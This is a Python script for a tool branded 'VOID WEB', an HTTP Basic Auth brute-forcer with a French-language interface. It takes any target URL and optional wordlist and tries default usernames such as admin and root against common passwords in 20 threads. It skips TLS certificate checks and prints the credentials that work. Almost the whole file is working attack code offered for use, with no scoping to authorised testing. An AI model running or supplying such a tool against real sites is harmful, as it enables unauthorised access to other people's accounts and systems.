import sys
if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
import os, time, math, concurrent.futures
import requests
from urllib.parse import urlparse
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.progress import Progress, SpinnerColumn, TextColumn
import urllib3
urllib3.disable_warnings()

console = Console()
TIMEOUT = 5

ASCII = r"""
   ██╗   ██╗ ██████╗ ██╗██████╗      ██╗    ██╗███████╗██████╗ 
   ██║   ██║██╔═══██╗██║██╔══██╗     ██║    ██║██╔════╝██╔══██╗
   ██║   ██║██║   ██║██║██║  ██║█████╗██║ █╗ ██║█████╗  ██████╔╝
   ╚██╗ ██╔╝██║   ██║██║██║  ██║╚════╝██║███╗██║██╔══╝  ██╔══██╗
    ╚████╔╝ ╚██████╔╝██║██████╔╝      ╚███╔███╔╝███████╗██████╔╝
     ╚═══╝   ╚═════╝ ╚═╝╚═════╝        ╚══╝╚══╝ ╚══════╝╚═════╝ 
"""
SUBTITLE = " H T T P   B A S I C   A U T H   B F "

def boot():
    if sys.platform.startswith("win"): os.system("title VOID WEB // BASIC AUTH BF")
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write("\033[?25l")
    lines = ASCII.strip("\n").split("\n")
    t0 = time.time()
    try:
        while time.time() - t0 < 1.4:
            t = time.time() - t0
            sys.stdout.write("\033[H\n")
            for line in lines:
                sys.stdout.write("  ")
                for c, ch in enumerate(line):
                    if ch == " ": sys.stdout.write(" ")
                    else:
                        v = max(40, min(255, int(100 + 155 * math.sin(t * 10 - c * 0.2))))
                        sys.stdout.write(f"\033[38;2;{v};0;0m{ch}")
                sys.stdout.write("\033[0m\n")
            sys.stdout.write(f"\n  \033[38;2;80;0;0m{SUBTITLE}\033[0m\n")
            sys.stdout.flush()
            time.sleep(0.025)
    finally:
        sys.stdout.write("\033[?25h\033[0m")
    os.system("cls" if os.name == "nt" else "clear")


DEFAULT_USERS = ["admin", "root", "administrator", "user", "test", "webmaster", "guest"]
DEFAULT_PASSWORDS = ["admin", "123456", "12345678", "password", "admin123", "root", "1234", "qwerty", "test", "0000"]

def try_login(url, u, p):
    try:
        r = requests.get(url, auth=(u, p), timeout=TIMEOUT, verify=False)
        if r.status_code in [200, 301, 302, 304]:
            return u, p, r.status_code
    except: pass
    return None

if __name__ == "__main__":
    try:
        boot()
        console.print(Align.center(Panel(
            Text.from_markup("[bold red]VOID-TOOLS[/]  [dim]//[/]  [white]VOID WEB[/]  [dim]//[/]  [red]BASIC AUTH BRUTEFORCER[/]"),
            border_style="red", padding=(0, 6)
        )))
        console.print()
        
        console.print(" [bold red]┌─[[/][bold white] URL Protégée Cible (ex: https://site.com/admin) [/][bold red]][/]")
        target = console.input(" [bold red]└─▶[/] [bold white]").strip()
        if not target: sys.exit(0)
        if not target.startswith("http"): target = "https://" + target
        
        console.print()
        console.print(" [bold red]┌─[[/][bold white] Chemin vers fichier Wordlist (Laisser vide pour utiliser la liste basique) [/][bold red]][/]")
        wordlist_path = console.input(" [bold red]└─▶[/] [bold white]").strip()
        
        passwords_to_try = DEFAULT_PASSWORDS
        if wordlist_path and os.path.isfile(wordlist_path):
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords_to_try = [line.strip() for line in f if line.strip()]
            console.print(f" [dim]Wordlist personnalisée chargée : {len(passwords_to_try)} mots de passe.[/]")
        
        console.print()
        found = False
        with Progress(SpinnerColumn(spinner_name="point", style="red"), TextColumn("[dim white]{task.description}"), console=console, transient=True) as p:
            task = p.add_task(f"Attaque HTTP Basic Auth sur {target}...", total=None)
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                futures = []
                for u in DEFAULT_USERS:
                    for pwd in passwords_to_try:
                        futures.append(ex.submit(try_login, target, u, pwd))
                
                for f in concurrent.futures.as_completed(futures):
                    res = f.result()
                    if res:
                        found = True
                        console.print(f"\n [bold green][✓] SUCCÈS ! IDENTIFIANTS TROUVÉS :[/]")
                        console.print(f" [dim]•[/] [bold white]Utilisateur :[/] [cyan]{res[0]}[/]")
                        console.print(f" [dim]•[/] [bold white]Mot de passe :[/] [cyan]{res[1]}[/]")
                        console.print(f" [dim]Code de réponse HTTP : {res[2]}[/]")
                        for f_abort in futures: f_abort.cancel()
                        break

        console.print()
        if not found:
            console.print(f" [bold red][x] Échec.[/] [dim]Aucune combinaison n'a fonctionné.[/]")
            console.print(f" [dim][!] Le site possède un mot de passe sécurisé. Utilisez une [bold white]Custom Wordlist[/] plus grande la prochaine fois ![/]")
        console.input("\n [dim]Appuyez sur [bold red]ENTRÉE[/] pour quitter...[/]")
    except (KeyboardInterrupt, EOFError): pass

